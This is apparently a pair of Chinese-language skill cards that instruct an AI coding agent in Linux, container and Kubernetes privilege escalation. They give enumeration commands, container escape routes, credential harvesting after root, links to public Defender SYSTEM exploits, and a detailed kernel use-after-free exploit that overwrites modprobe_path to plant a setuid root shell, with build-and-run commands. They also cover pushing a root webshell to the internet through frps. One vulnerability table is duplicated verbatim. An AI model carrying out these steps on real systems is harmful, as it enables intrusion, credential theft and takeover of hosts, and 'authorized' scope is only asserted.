---
name: linux-privilege-escalation
description: >-
  Linux / 容器 / K8s 权限提升。低权 shell 后按内核/glibc/OS 版本适配提权。
  触发：Linux 提权、LPE、SUID、sudo、GTFOBins、capabilities、cron、
  DirtyPipe、PwnKit、Baron Samedit、Looney Tunables、GameOver(lay)、
  CVE-2026-3888、snap-confine、snapd、
  容器逃逸、docker.sock、runc、K8s Pod 逃逸、ServiceAccount。
  Windows 走 windows-lpe；应用面 JWT/GVA 提权走 提权手法.md §2。
tags: [systemd, User=, 提权, 低权shell, 本地提权, linux提权, 内核提权, suid, sudo提权]
---

# Linux 权限提升

拿到低权 shell 后提升到 root / 逃出容器。先枚举、再按版本选攻击，禁止盲打内核 PoC。

先读：`docs/playbooks/Linux主机提权手法.md`

```bash
python3 tools/ops/linux_lpe_checker.py --case <案>
python3 tools/ops/linux_lpe_checker.py --json --out /tmp/lpe_$(hostname).json
python3 tools/ops/host_ir_check.py --case <案>
```

PwnKit / Baron Samedit / DirtyPipe / CVE-2026-3888 点名：`python3 tools/ops/hypothesis_route.py --signal <词>`

## 分流

| 指纹 | 走 |
|------|-----|
| 普通 Linux SUID/sudo/cron/kernel | 本卡 + `linux_lpe_checker.py` + `linux-post-exploit` |
| `--privileged` / docker.sock / runc / cgroup release_agent | `container-security-testing` · `容器逃逸手法.md` |
| K8s SA / kubelet / pods/exec | `K8s特权Pod手法.md` |
| Windows | `windows-lpe` |
| 无 shell 的应用面提权 | `docs/playbooks/提权手法.md` §2 |
| 宝塔机已有 www-data | Playbook §3.1 + `宝塔与phpMyAdmin拿面板手法.md` |

## 30 秒枚举

```bash
id; hostname; uname -a
cat /etc/os-release
ldd --version
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | head -40
capsh --print 2>/dev/null
ls -la /var/run/docker.sock /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null
```

钉死：**内核 build、发行版、glibc**。glibc ≥ 2.34 不要打 `__free_hook`。

`ls -ld /bin` 见 `lrwxrwxrwx` **不等于可写**（Debian/宝塔 `/bin` → `/usr/bin` 常见 555）。以 checker `LOCAL-PATH` 为准。

## 向量优先序

```
NOPASSWD sudo → docker/lxd 组 → 危险 SUID/GTFOBins → cap_setuid/dac_override
  → cron / crontab PATH → 宝塔 default.db / 本机 MySQL 弱口
  → passwd/shadow 可写 → 内核 CVE
  → 全阴：收割 env/.env/yml/历史 → 横向
```

CVE 匹配表见 Playbook §6。checker `--cve-only` 只报版本线索，过六门闸才算提权成功。

## 档位

| 档 | 动作 | 成功证据 |
|----|------|----------|
| L1 | checker + 枚举 | `接管/lpe/lpe.json` 有候选 |
| L2 | 配置面（sudo/SUID/docker/cron/cap/宝塔） | `id` → uid=0 |
| L3 | 内核 / 容器逃逸（先评估稳定性） | root 或出容器到宿主机 |

授权内配置面 L2 直接做。打崩目标的内核 exploit 能换用户态就换。

## 容器 / K8s

- 特权容器、`docker.sock`、危险 cap、`runc` CVE、cgroup `release_agent`
- 容器内先读 SA token，再打 K8s API；`create pod` / `pods/exec` 授权内直接做
- kubelet 未鉴权、etcd 暴露 → 专卡，不在本卡硬打

## 提权后

1. 立刻 `host_ir_check.py` 排后门  
2. `credential-harvest`：支付 KEY、`application*.yml`、本机 MySQL/Redis、heapdump  
3. 要进内网 → `internal-tunnel` / `ad-windows-router`  
4. 总控闸门：`pentest-methodology`

## 真源

- Playbook：`docs/playbooks/Linux主机提权手法.md` · `容器逃逸手法.md` · `K8s特权Pod手法.md` · `提权手法.md`
- 工具：`python3 tools/ops/linux_lpe_checker.py --help`
- 下阶：`.cursor/skills/linux-post-exploit`

---

<!-- 补充视角: privilege-escalation (兄弟技能库 2026-09-12) -->

---
name: privilege-escalation
description: "Privilege escalation encyclopedia — Linux SUID/capabilities/cron, Windows token/service/driver, UAC bypass, SeImpersonate. Trigger: privesc, privilege escalation, root, system, suid, sudo, uac bypass."
---

# Privilege Escalation

## Windows LPE: Microsoft Defender 提权链(Nightmare Eclipse 系列, 2026)
一条持续更新的真机 SYSTEM 提权链(PoC 公开,部分**至今无补丁**):
- 演进: **RoguePlanet**(2026-06 披露,7 月修)→ **ShieldBreak CVE-2026-69414**(2026-09 修)→ **ShieldCrash**(绕过 ShieldBreak 补丁的 0day)
- ShieldCrash 现状: Win10/11/Server **打全 9 月补丁也可**提权到 SYSTEM(当前公开 PoC 为 `arbitrary file read as SYSTEM` 骨架,作者称或升级为完整 SYSTEM 写)
- 系列其余: LegacyHive(Windows 提权)/ BlueHammer / RedSun / YellowKey(BitLocker 0day 访问受保护盘)/ GreenPlasma / MiniPlasma / UnDefend —— 官方仍未全部修
- PoC: https://github.com/MSNightmare/ShieldCrash ;UnDefend https://github.com/Nightmare-Eclipse/UnDefend
- 打法: 目标机跑 Defender 时,Windows 提权面里**优先试这条有公开 PoC 的链**(尤其补丁落后的 Server);即便只拿到 `SYSTEM 读` 也能用于读 SAM/LSA/浏览器凭据
- 来源: https://www.bleepingcomputer.com/news/security/new-microsoft-defender-shieldcrash-zero-day-grants-system-access/

## CISA KEV 在野 — Linux Kernel LPE（2026-09-18）

三条 Linux 内核漏洞同时被 CISA 加入 KEV，Red Hat 确认"已知公开 exploit"。

| CVE | 组件 | CVSS | 类型 | 修复内核版本 |
|---|---|---|---|---|
| CVE-2025-39964 | AF_ALG socket 并发写 | 7.8 | 竞态→崩溃/密码学损坏 | 5.10.245, 5.15.194, 6.1.154, 6.6.108 |
| CVE-2026-53266 | ebtables SNAT/ARP 重写 | 8.8 | 越界写→LPE/DoS | 发行版补丁 |
| CVE-2025-39682 | kTLS 零长度记录 | 9.8 | 异常条件→内存泄露/DoS | 发行版补丁 |

**利用条件**：全部需本地访问（已有低权 shell）。
**实战场景**：拿到 webshell / 容器 shell 后，`uname -r` 确认版本，未修复则可组合利用。
**排查**：`rpm -q kernel` / `dpkg -l linux-image*` → 对照修复版本。

## RustyTux — ESP-in-TCP strparser 竞态 LPE（CentOS Stream 9 / Ubuntu 26.04，2026-09）

**PoC**：[m0x41nos/RustyTux](https://github.com/m0x41nos/RustyTux)（Rust 实现，静态编译）  
**漏洞类型**：ESP-in-TCP receive parser 与 socket teardown 竞态 → `strp_done()` 取消 timer 后 `msg_timer_work` 仍被重新 arm → UAF  
**内核版本**：CentOS Stream 9 `kernel-core-5.14.0-745.el9.x86_64`；Ubuntu 26.04 LTS 同样受影响（2026-09 确认）

### 竞态时序（六事件偏序 A < C < T < F < R < E）

```text
A  receive parser 在 strp->stopped 仍为 false 时被放入（strp_data_ready 通过 stopped==0 检查）
C  close 路径 cancel_delayed_work_sync(&msg_timer_work) 返回
T  已放入的 parser 在 cancel 之后重新 arm msg_timer_work（strp_start_timer）
F  espintcp_destruct() → kfree(ctx) 释放
R  user-key payload 重占释放的 ctx 分配块（keyctl KEYCTL_UPDATE）
E  stale timer 到期，读到替换后的 timer_list 字节
```

关键：`cancel_delayed_work_sync` 返回后不禁止后续 arm；已放入的 parser 持有 socket 底半自旋锁，完整 keepalive filler 延长了这次 parser 执行时间直到遇到最后的 partial frame → `strp_start_timer`。

### Delta Callback Gadget（写原语）

重占后 timer 到期调用 `timer->function(timer)`，RDI = `&ctx->strp.msg_timer_work.timer`。  
选取的回调 gadget：**`iocg_flush_stat_upward()`**（`block/blk-iocost.c`）。

核心逻辑（简化）：
```c
level  = *(s32 *)(rdi + OFF_LEVEL);   // 设为 1
parent = *(u64 *)(rdi + OFF_PARENT0); // 设为 target - WRITE_TARGET_ADJ

// 实现 *(u64*)target += delta（任意 64 位内核内存写）
*(u64 *)(parent + OFF_ACC0 - OFF_RDI) += *(u64 *)(rdi+OFF_ACC0) - *(u64 *)(rdi+OFF_BASE0);
```

**效果**：`add qword ptr [kbase + WRITE_TARGET_OFFSET], delta` → 覆写 `modprobe_path` → 触发 helper → setuid shell `/tmp/rootsh`。

### CentOS Stream 9 偏移表（`TARGET_FIELD_SHIFT = 0x10`）

| 字段 | 归一化偏移 | 目标 build 偏移（+0x10） |
|------|-----------|--------------------------|
| level | 0x1a0 | 0x1b0 = OFF_LEVEL |
| parent[0] | 0x1a8 | 0x1b8 = OFF_PARENT0 |
| acc[0] | 0x138 | 0x148 = OFF_ACC0 |
| base[0] | 0x158 | 0x168 = OFF_BASE0 |

```text
WRITE_TARGET_ADJ = 0x138 + TARGET_FIELD_SHIFT = 0x148
parent = kbase + WRITE_TARGET_OFFSET - 0x148
```

### 使用

```bash
git clone https://github.com/m0x41nos/RustyTux.git
cd RustyTux && make exploit

./exploit                   # 默认时序（渐进缩短 close delay）
./exploit --fixed-timing    # 固定时序（调试用）
./exploit --aggressive      # 更多早期 close 时机
./exploit --max-windows 50  # 限制 race windows 数量

# 版本检查
rpm -q kernel-core 2>/dev/null || uname -r
# 5.14.0-745.el9.x86_64 → 受影响
```

### 踩坑

| 坑 | 说明 |
|----|------|
| KASLR leak 失败时 exploit 提前退出 | prefetch timing channel 对虚拟机/无 L2 cache 环境成功率低 |
| 竞态非确定性 | socket close delay 必须对目标 build 调参，同 build 不同机器可能也要重调 |
| 移植到其他 build 需更新 3 个偏移 | `target_func`、`WRITE_TARGET_OFFSET`、`TARGET_FIELD_SHIFT` |
| 不稳定内核 exploit → 优先换用户态向量 | docker/sudo/SUID/cron 崩目标代价远比 LPE 大 |
| `strp_start_timer` 需要非零且非 LONG_MAX 的 rcvtimeo | 默认 `sk_rcvtimeo = LONG_MAX` 不 arm timer；exploit 需设置有限超时 |

三条 Linux 内核漏洞同时被 CISA 加入 KEV，Red Hat 确认"已知公开 exploit"。

| CVE | 组件 | CVSS | 类型 | 修复内核版本 |
|---|---|---|---|---|
| CVE-2025-39964 | AF_ALG socket 并发写 | 7.8 | 竞态→崩溃/密码学损坏 | 5.10.245, 5.15.194, 6.1.154, 6.6.108 |
| CVE-2026-53266 | ebtables SNAT/ARP 重写 | 8.8 | 越界写→LPE/DoS | 发行版补丁 |
| CVE-2025-39682 | kTLS 零长度记录 | 9.8 | 异常条件→内存泄露/DoS | 发行版补丁 |

**利用条件**：全部需本地访问（已有低权 shell）。
**实战场景**：拿到 webshell / 容器 shell 后，`uname -r` 确认版本，未修复则可组合利用。
**排查**：`rpm -q kernel` / `dpkg -l linux-image*` → 对照修复版本。

## 基础矩阵(占位,后续按 intel-ingest 增量补全)
Privilege escalation encyclopedia — Linux SUID/capabilities/cron, Windows token/service/driver, UAC bypass, SeImpersonate. Trigger: privesc, privilege escalation, root, system, suid, sudo, uac bypass.
- 自带脚本: scripts/linpeas.py(Linux 枚举)/ scripts/winpeas.py(Windows 枚举)

## systemd 缺 User= → root + frps 推公网（2026-10 财神 C2 实锤）

`/etc/systemd/system/*.service` 未声明 `User=` 视为 system 服务，默认 root：
- `systemctl cat <svc> | grep -E 'User=|ExecStart'`；若 ExecStart 是 `php -S 127.0.0.1:PORT`，站点马即 root
- 配 frps `[[proxies]] remotePort = N` 把 127.0.0.1 服务顶到公网 → 外网直连即 root
- 落马后先 `id` 验 uid=0；同机常并存第三方冰蝎马，别把别人的马当自己的成果
